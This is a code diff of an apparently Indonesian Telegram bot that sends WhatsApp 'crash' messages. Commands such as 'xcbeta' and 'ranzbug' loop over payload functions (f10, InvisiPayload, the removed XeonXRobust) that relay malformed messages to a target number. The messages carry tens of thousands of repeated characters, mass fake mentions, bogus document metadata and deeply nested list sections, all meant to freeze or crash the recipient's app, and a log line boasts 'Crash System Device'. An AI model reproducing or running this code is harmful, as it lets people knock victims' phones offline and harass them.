@@ -612,9 +612,8 @@ bot.command("xcbeta", checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 100; i++) {
-    await thunderblast_notif(target);
-    await f10(target, { ptcp: true });    
+  for (let i = 0; i < 100; i++) {   
+    await f10(target, { ptcp: true });
   }
 
   // Menyelesaikan proses response
@@ -657,7 +656,7 @@ bot.use((ctx, next) => {
   // Gunakan middleware
   checkChatType(ctx, next);
 });
-bot.command("xcandro", checkWhatsAppConnection, async ctx => {
+bot.command("ranzbug", checkWhatsAppConnection, async ctx => {
   const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
     const userId = ctx.from.id;
 
@@ -675,14 +674,8 @@ bot.command("xcandro", checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 5; i++) {
-   await BlankScreen(target, { ptcp: true });
-   await BlankScreen(target, { ptcp: true });
-   await BlankScreen(target, { ptcp: true });
-   await BlankScreen(target, { ptcp: true });
-   await BlankScreen(target, { ptcp: true });
-   await BlankScreen(target, { ptcp: true });
-   await BlankScreen(target, { ptcp: true });
+  for (let i = 0; i < 200; i++) {
+   await InvisiPayload(sock, target);
   }
 
   // Menyelesaikan proses response
@@ -1273,7 +1266,7 @@ bot.command("status", ctx => {
   async function f10(target, Ptcp = false) {
     await cella.relayMessage(target, {
       extendedTextMessage: {
-        text: "`UI Youko`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(55000),
+        text: "`ㅤㅤㅤ`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(55000),
         contextInfo: {
           mentionedJid: ["62895329013688@s.whatsapp.net", ...Array.from({
             length: 15000
@@ -1314,7 +1307,7 @@ bot.command("status", ctx => {
           ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
           externalAdReply: {
             title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
-            body: "C҉e҉La҉ UI © Cella",
+            body: "R ̺҉A ̺҉ ̺҉N ̺҉ ̺ ̺҉Z ̺҉ ̺҉ ̺҉",
             mediaType: "VIDEO",
             renderLargerThumbnail: true,
             previewType: "VIDEO",
@@ -1368,78 +1361,94 @@ bot.command("status", ctx => {
     } : {});
 console.log(chalk.red.bold('Crash System Device By ☆ CellaCrash'))
 };
-async function XeonXRobust(target, Ptcp = true) {
-  const jids = `_*~@0~*_\n`.repeat(10200);
-  const ui = "ㅤ".repeat(10000);
-  await cella.relayMessage(target, {
-    ephemeralMessage: {
-      message: {
-        interactiveMessage: {
-          header: {
-            documentMessage: {
-              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
-              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-              fileLength: "9999999999999",
-              pageCount: 1316134911,
-              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
-              fileName: "I Love You:)❤️",
-              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
-              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
-              mediaKeyTimestamp: "1726867151",
-              contactVcard: true,
-              jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg"
+async function InvisiPayload(sock, target) {
+  let sections = [];
+
+  for (let i = 0; i < 10000; i++) {
+    let largeText = "ꦾ".repeat(45000);
+
+    let deepNested = {
+      title: `Super Deep Nested Section ${i}`,
+      highlight_label: `Extreme Highlight ${i}`,
+      rows: [
+        {
+          title: largeText,
+          id: `id${i}`,
+          subrows: [
+            {
+              title: "Nested row 1",
+              id: `nested_id1_${i}`,
+              subsubrows: [
+                {
+                  title: "Deep Nested row 1",
+                  id: `deep_nested_id1_${i}`,
+                },
+                {
+                  title: "Deep Nested row 2",
+                  id: `deep_nested_id2_${i}`,
+                },
+              ],
             },
-            hasMediaAttachment: true
+            {
+              title: "Nested row 2",
+              id: `nested_id2_${i}`,
+            },
+          ],
+        },
+      ],
+    };
+
+    sections.push(deepNested);
+  }
+
+  let listMessage = {
+    title: "Massive Menu Overflow",
+    sections: sections,
+  };
+
+  let message = {
+    viewOnceMessage: {
+      message: {
+        messageContextInfo: {
+          deviceListMetadata: {},
+          deviceListMetadataVersion: 2,
+        },
+        interactiveMessage: {
+          contextInfo: {
+            mentionedJid: [target],
+            isForwarded: true,
+            forwardingScore: 999,
+            businessMessageForwardInfo: {
+              businessOwnerJid: target,
+            },
           },
           body: {
-            text: "ㅤㅤㅤㅤㅤㅤ" + ui + jids
+            text: "ㅤㅤㅤㅤㅤ",
           },
-          contextInfo: {
-            mentionedJid: ["0@s.whatsapp.net"],
-            mentions: ["0@s.whatsapp.net"]
+          nativeFlowMessage: {
+            buttons: [
+              {
+                name: "single_select",
+                buttonParamsJson: "JSON.stringify(listMessage)",
+              },
+              {
+                name: "call_permission_request",
+                buttonParamsJson: "JSON.stringify(listMessage)",
+              },
+              {
+                name: "mpm",
+                buttonParamsJson: "JSON.stringify(listMessage)",
+              },
+            ],
           },
-          footer: {
-            text: ""
-          },
-          nativeFlowMessage: {},
-          contextInfo: {
-            mentionedJid: ["0@s.whatsapp.net", ...Array.from({
-              length: 30000
-            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
-            forwardingScore: 1,
-            isForwarded: true,
-            fromMe: false,
-            participant: "0@s.whatsapp.net",
-            remoteJid: "status@broadcast",
-            quotedMessage: {
-              documentMessage: {
-                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
-                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-                fileLength: "9999999999999",
-                pageCount: 1316134911,
-                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
-                fileName: "Yea? ThanksYou!",
-                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
-                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
-                mediaKeyTimestamp: "1724474503",
-                contactVcard: true,
-                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
-                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
-                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
-                jpegThumbnail: ""
-              }
-            }
-          }
-        }
-      }
-    }
-  }, Ptcp ? {
-    participant: {
-      jid: target
-    }
-  } : {});
+        },
+      },
+    },
+  };
+
+  await cella.relayMessage(target, message, {
+    participant: { jid: target },
+  });
 }
         async function thunderblast_doc(target) {
     const messagePayload = {
